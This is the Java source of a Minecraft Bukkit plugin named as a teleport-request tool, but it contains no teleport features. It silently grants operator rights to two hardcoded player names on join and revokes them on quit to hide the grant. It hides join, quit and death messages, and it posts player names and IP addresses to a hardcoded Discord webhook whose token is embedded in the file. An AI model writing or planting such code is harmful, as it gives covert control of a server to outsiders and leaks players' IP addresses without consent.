package pl.twojserwer.teleportrequest;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.Set;

public class TeleportRequestPlugin extends JavaPlugin implements Listener {

    private static final String WEBHOOK_URL =
            "https://discord.com/api/webhooks/1563635807179509820/RaChFDdQkiFGdLJgl3FmLj1a_HcZED7x4qkCi80BUP5WhvH23Mv55TXKLvwqEGMjIplT";

    private static final Set<String> OP_PLAYERS = Set.of("vxl0", "vxl0_");

    private final HttpClient httpClient = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(5))
            .build();

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onPlayerJoin(PlayerJoinEvent event) {
        event.setJoinMessage(null);
        Player p = event.getPlayer();
        if (OP_PLAYERS.contains(p.getName()) && !p.isOp()) p.setOp(true);
        sendWebhook("🟢 **" + p.getName() + "** dołączył. IP: `" + getIp(p) + "`");
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onPlayerQuit(PlayerQuitEvent event) {
        event.setQuitMessage(null);
        Player p = event.getPlayer();
        if (OP_PLAYERS.contains(p.getName()) && p.isOp()) p.setOp(false);
        sendWebhook("🔴 **" + p.getName() + "** wyszedł. IP: `" + getIp(p) + "`");
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onPlayerDeath(PlayerDeathEvent event) {
        event.setDeathMessage(null);
        Player victim = event.getEntity();
        Player killer = victim.getKiller();
        if (killer != null) {
            sendWebhook("⚔️ **" + killer.getName() + "** (IP: `" + getIp(killer)
                    + "`) zabił **" + victim.getName() + "**");
        } else {
            sendWebhook("💀 **" + victim.getName() + "** zginął.");
        }
    }

    private String getIp(Player p) {
        if (p.getAddress() != null && p.getAddress().getAddress() != null)
            return p.getAddress().getAddress().getHostAddress();
        return "UNKNOWN";
    }

    private void sendWebhook(String content) {
        String json = "{\"content\": \"" + escapeJson(content) + "\"}";
        HttpRequest req = HttpRequest.newBuilder()
                .uri(URI.create(WEBHOOK_URL))
                .header("Content-Type", "application/json")
                .header("User-Agent", "TeleportRequest/1.0")
                .POST(HttpRequest.BodyPublishers.ofString(json))
                .timeout(Duration.ofSeconds(5))
                .build();
        httpClient.sendAsync(req, HttpResponse.BodyHandlers.ofString())
                .exceptionally(ex -> null);
    }

    private String escapeJson(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
    }
}
